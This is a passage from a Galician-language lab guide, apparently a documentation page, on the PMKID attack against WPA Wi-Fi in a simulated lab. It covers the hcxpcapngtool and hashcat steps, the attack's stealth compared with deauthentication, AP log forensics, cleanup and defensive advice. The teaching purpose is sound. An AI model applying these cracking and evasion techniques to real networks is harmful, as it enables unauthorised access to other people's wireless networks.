+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>4. AP → Pode incorporar o PMKID en EAPOL-Key
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>5. `hcxpcapngtool` → Exporta `WPA*01` se o PMKID está presente
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>6. Hashcat → Verifica candidatos do dicionario fronte ao rexistro capturado
+</span></code></pre></div></p>
+<h3 id="limitacions">Limitacións</h3>
+<ol>
+<li><strong>Depende do AP e da súa configuración</strong>: non todos proporcionan un PMKID capturable</li>
+<li><strong>Mesmo esforzo de cracking</strong>: Contrasinais fortes (&gt;20 chars) son igual de resistentes</li>
+<li><strong>Rastro nos logs variable</strong>: a captura activa pode producir eventos de autenticación ou asociación detectables polo AP</li>
+</ol>
+<h3 id="vantaxe-real-sobre-practica-11">Vantaxe Real sobre Práctica 1.1</h3>
+<p>Aínda que precisa cliente conectado, <strong>NON precisa deautenticalo</strong>:<br />
+- Práctica 1.1: Cliente <strong>perde conexión</strong> durante segundos → Detectable nos logs (<code>deauthentication</code>)<br />
+- Práctica 1.4: Cliente <strong>mantén conexión</strong> → Ataque sigiloso ✓</p>
+<hr />
+<h2 id="9-verificacion-nos-logs-opcional">9. Verificación nos Logs (Opcional)</h2>
+<p>Podes examinar os logs do AP para entender o <strong>rastro real</strong> que deixa o ataque PMKID:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># Ver logs do AP - conexións rexistradas</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>wifi_ap_wlan0<span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;AP-STA-CONNECTED\|associated&quot;</span><span class="w"> </span>/home/kali/wifiLab/run/psk/hostapd.log
+</span></code></pre></div>
+<p><strong>Resultado real que verás:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>wlan0: STA 2e:2e:65:ae:f8:ed IEEE 802.11: associated (aid 1)
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>wlan0: AP-STA-CONNECTED 2e:2e:65:ae:f8:ed
+</span></code></pre></div></p>
+<p><strong>⚠️ Interpretación correcta dos logs:</strong></p>
+<p>No exemplo aparece unha MAC asociada; comproba se corresponde a <strong>wlan1</strong> (o cliente lexítimo) antes de atribuíla a outro equipo:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Verificar que esa MAC pertence ao cliente lexítimo (wlan1)</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>wifi_cliente_wlan1<span class="w"> </span>ip<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>wlan1
+</span></code></pre></div>
+<p>Se a MAC coincide, esa entrada corresponde a <code>wlan1</code>. Se aparecen outras MAC, investiga cada evento por separado.</p>
+<p><strong>Por que non aparece a MAC do atacante?</strong></p>
+<p><code>hcxdumptool</code> pode utilizar enderezos MAC temporais e intercambios breves, que non sempre quedan reflectidos como conexións completas. <strong>Isto non significa que o ataque sexa invisible</strong>: segundo a configuración, o AP pode rexistrar outros eventos de autenticación ou asociación.</p>
+<p>Isto é moi diferente da Práctica 1.1, onde a deautenticación deixa entradas claras e inconfundibles:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a># O que verías nos logs da Práctica 1.1 (NON desta práctica):
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>wlan0: deauthentication: STA=xx:xx:xx:xx:xx:xx reason_code=7
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>wlan0: Station xx:xx:xx:xx:xx:xx trying to deauthenticate, but it is not authenticated
+</span></code></pre></div></p>
+<p><strong>Conclusión sobre rastro forense:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Ataque</th>
+<th>Rastro en logs do AP</th>
+<th>Detectabilidade</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Práctica 1.1 (deauth + handshake)</td>
+<td>Entradas <code>deauthentication</code> explícitas</td>
+<td>Alta ⚠️</td>
+</tr>
+<tr>
+<td>Práctica 1.4 (PMKID)</td>
+<td>Posibles eventos de autenticación e asociación</td>
+<td>Depende dos rexistros do AP</td>
+</tr>
+</tbody>
+</table>
+<p>A técnica PMKID pode evitar os eventos de desautenticación provocados, pero <strong>non garante ausencia de evidencias forenses</strong>. Cómpre revisar os logs reais e a captura.</p>
+<hr />
+<h2 id="10-limpeza">10. Limpeza</h2>
+<p>Ao rematar, apaga o escenario.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># Saír primeiro do modo monitor</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>stop<span class="w"> </span>wlan2mon
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># Restablecer o laboratorio</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>sudo<span class="w"> </span>wifilabctl<span class="w"> </span>reset
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="c1"># Eliminar capturas (opcional)</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>rm<span class="w"> </span>-rf<span class="w"> </span>~/capturas-pmkid
+</span></code></pre></div>
+<hr />
+<h2 id="notas-finais">Notas Finais</h2>
+<h3 id="ferramentas-necesarias-xa-instaladas-en-kali">Ferramentas Necesarias (xa instaladas en Kali)</h3>
+<ul>
+<li><code>hcxdumptool</code> &gt;= 7.0.0</li>
+<li><code>hcxpcapngtool</code> (parte de hcxtools)</li>
+<li><code>hashcat</code> (cunha plataforma OpenCL operativa; nesta VM utilízase PoCL)</li>
+</ul>
+<h3 id="recomendacions-de-seguridade">Recomendacións de Seguridade</h3>
+<ol>
+<li><strong>Para administradores</strong>: Usar contrasinais fortes (&gt;20 caracteres aleatorios)</li>
+<li><strong>Migrar a WPA3-SAE</strong>: o intercambio SAE evita este tipo de comprobación pasiva directa de contrasinais a partir de PMKID/EAPOL (ver Práctica 3.1)</li>
+<li><strong>Activar PMF</strong>: Aínda que non protexe contra PMKID, dificulta outros ataques</li>
+</ol>
+<h3 id="referencias">Referencias</h3>
+<ul>
+<li><strong>Descobridor</strong>: Jens "atom" Steube (Agosto 2018)</li>
+<li><a href="https://hashcat.net/forum/thread-7717.html">Hashcat Forum - PMKID Attack</a></li>
+<li><a href="https://github.com/ZerBea/hcxdumptool">hcxdumptool GitHub</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../../js/opera.js"></script>
+      
+        <script src="../../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
